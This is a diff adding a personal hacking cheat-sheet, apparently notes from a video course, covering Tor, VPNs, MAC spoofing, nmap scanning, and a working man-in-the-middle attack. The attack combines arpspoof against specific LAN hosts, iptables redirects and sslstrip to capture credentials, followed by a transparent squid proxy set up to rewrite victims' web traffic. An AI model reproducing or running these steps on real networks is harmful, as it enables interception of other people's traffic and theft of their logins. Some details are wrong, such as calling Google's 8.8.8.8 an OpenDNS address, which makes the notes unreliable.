@@ -1,0 +1,113 @@
+#TOR
+service tor status
+# shows status of tor
+service tor start
+# starts tor
+# make sure to check settings
+proxychains firefox www.enteraddress.com
+# do not use tor as root
+# check for dns leaks (search online)
+
+# VPN
+vim /etc/NetworkManager/NetworkManager.conf
+# change to true, this will not reset
+service network-manager restart
+# install network manager packages
+apt-get install network-manager-openvpn-gnome
+apt-get install network-manager-pptp
+apt-get install network-manager-pptp-gnome
+apt-get install network-manager-strongswan
+apt-get install network-manager-vpnc
+apt-get install network-manager-vpnc-gnome
+# go to network manager and add VPN
+# can try vpnbook, download openvpn configs
+# or: use terminal
+cd ~/Downloads/VPNBook.com-OpenVPN-DE1
+openvpn --config vpnbook-de233-tcp443.ovpn
+# navigate to VPNBook page for username and pw
+# now secure yourself from dns leaks
+vim /etc/resolv.conf
+# comment out the nameserver ip address
+# add opendns ip address eg. 8.8.8.8 or 8.8.4.4
+# don't reset service, it will wipe your changes
+
+# MAC ADDRESS
+ifconfig eth0
+# identify MAC address, eg. 08:00:27:78:86:27
+macchanger -s eth0
+# alternative way to show MAC address
+# first half of mac is the vendor bytes
+macchanger -l 
+# echoes a hardware list
+# good way to disguise yourself as a regular device
+macchanger -r eth0
+# current MAC is shown within the network
+# you can make a script that changes this every time you boot
+crontab -e
+@reboot macchanger -r eth0
+# add the above to crontab to run command on reboot
+
+# NMAP
+nslookup scanme.nmap.org
+# all DNS traffic runs on port #53
+# gives the ip address of the domain
+nslookup 45.33.32.156
+# does a reverse lookup
+nmap -vv scanme.nmap.org 
+# scans ports
+nmap -oG - 10.0.0.0-255 -p 22 -vv > ~/SCAN
+# scans a range of ports on LAN with a greppable output
+cat SCAN | grep Up | awk -F " " '{print $2}'
+# shows open ports, awk -F is the field delimiter, $2 indicates second field
+# pass this into a new file, eg. SCAN2
+nmap -iL SCAN2
+# NOTE: do not show people your scanned MAC addresses (why?)
+# not a big deal, but it can be used to identify you, or take your identity
+curl ipinfo.io//45.33.32.156
+# this is legal public information about any given ip
+# limited to 1000 queries per day
+# use NSEDoc scripts to scan for vulnerabilities
+
+# SSLSTRIP
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+# -A is for append, 8080 is the port we listen to
+iptables -t nat -L PREROUTING
+# use the above to verify, expect: anywhere anywhere http 8080 ...
+# find target using ifconfig, route, nmap <ipaddress> -vv
+# if no open routes, use -Pn or -O with nmap
+# for some reason, nmap appears to scan more thoroughly if you use 10.0.0.0/24
+arpspoof -i eth0 -t 10.0.0.138 -r 10.0.0.63
+# must specify interface, host, and target, doesn't work through wlan0?
+iptables -L INPUT
+iptables -I INPUT 1 -p tcp --dport 8080 -j ACCEPT
+# use above to check if port is open, and then open it if it isn't
+sslstrip -l 8080
+tail -f sslstrip.log
+# run arpspoof, sslstrip and tail at the same time
+# should get encoded data, does not appear to work on chromium
+# firefox ESR can be sniffed, wont pick up NetSurf, Lynx
+# appear to need arpspoof running, -t 63 -r 138
+
+# FUN THINGS
+apt-get install imagemagick ghostscript jp2a squid3 apache2
+# search for .pl files, eg. flopImages, noInternet asciiImages
+# googleSearch touretteImages
+# copy them into a new vim file, save it and chmod +x
+# you may need to modify the .pl file, change ourIP etc.
+vim /etc/squid/squid.conf
+/ acl localnet src
+# search for the above line, uncomment the proper configuration
+/ http_access allow localnet
+# uncomment this line above
+/ http_port 3128 
+# make sure it is transparent
+url_rewrite_program /root/squidscripts/googlesearch.pl
+# add the above to the very end of the config
+service squid restart
+iptables -t nat -A PREROUTING -i eth0 -p tcp --destination-port 80 -j REDIRECT --to-port 3128
+echo 1 > /proc/sys/net/ipv4/ip_forward
+# make sure to echo before you start this
+mkdir /var/www/tmp
+chmod 777 /var/www/tmp
+## up to: 9:01:21
